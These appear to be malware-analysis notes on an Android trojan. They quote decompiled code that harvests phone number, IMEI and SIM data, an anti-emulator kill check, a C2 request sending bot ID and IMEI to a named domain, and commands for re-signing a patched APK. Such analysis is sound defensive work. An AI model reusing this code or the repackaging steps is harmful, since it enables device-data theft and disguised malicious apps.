# Reference: https://developer.android.com/reference/android/telephony/TelephonyManager

# Some GREAT Background

1. Android Security:
	-> Sandboxing
		- Each app is given UID, GUID and a private directory where only they have the persmissiont to write
	-> Permission
		- In Android Manifest.xml
	-> Interprocess Communication using binders
	-> Application
		- Activity: A user interface is presented on a single screen
		- Service: Background process
		- Content Providers: for sharing data
		- Broadcast Recievers: Broadcasts issued by Android for ex SMS, phone call, Network activity chages??
		- intent: request actions from another components


main function:
	com.soft360.iService.MainActivity


1. builds some string 

	private string a()

	new StringBuilder(String.valueOf(111111111 + ((int) (Math.random() * 8.88888888E8d)))).toString();
	used with other string concantination 
	result was 961133411, second time 881699473; so randomly generated.
	this.f239a.d(str2);

2. m446b()
	-> gets all running process, if it is, startswith com.BioTechnology.iClientsService return true

3. b(str)
	-> set data in clipboard("message",str) 

4. c()
	-> get and return phone number and subscriber ID

5. d()
	-> returns the network operator name
6. e()

	-> returns sim serial number

7. final void a()
	-> set visibility 

# onCreate() is the first function to get executed

8. onCreate()
	-> if condition matches then exit()
if (getResources().getString(2131165187).equals("1") && (deviceId.equals("000000000000000") || c().startsWith("1555521") || d().equals("Android") || e().equals("89014103211118510720"))) {
                Process.killProcess(Process.myPid());
            }

	-> When sms recieved call SmsReciever.class, could not be decompiled properly the onRecieve() function

	if not b() -> if no string was returned
	-> starts the service Aservice.class and webService.class
startService(new Intent(this, AService.class));
                startService(new Intent(this, webService.class));

	-> ensure that the services are autorun
               startService(new Intent(this, webService.class));
                Editor edit = defaultSharedPreferences.edit();
                edit.putBoolean("autorun", true);
                edit.commit();

	else:
		autorun is false


	Switch case:
		and then setting a lot of ui i think (setcontentview)

9. MyPhoneReciever -> e.s -> e.q  // is http website
	eq -> String str3 = a2.a(AService.a) + str + "?bot_id=" + a2.b() + "&imei=" + eqVar.d;
		a2.a(30)
		a2 = du.a(null) -> one function that hadnles null -> which returns probably context to current program
		context.a() -> a is resource? or du.a() function call?
		-> from this we can conclude that a2.b() returns botID and eqVAr.d is the imei number	



	em -> looks like getting checking the command provided by the user


url: http://bxateca.net/


# Some Great Notes for Malware Analysis
1. Virustotal and manifest
	- manifest main name see function
2. Signing infromation to see who signed it
	- keytool -printcert -file CERT.RSA 
3. Extracted strings and URLs
	- Domain , virustotal  DNS address query result
4. Anti Emulation:
	- Process.killProcess(Process.myPid());
5. Patching:
	- Change smali, Remove meta.inf and replace key using jarsigner # you have to change smali not java
	- generate keystore: sudo keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
	- sign keys: sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore facebook.apk alias_name
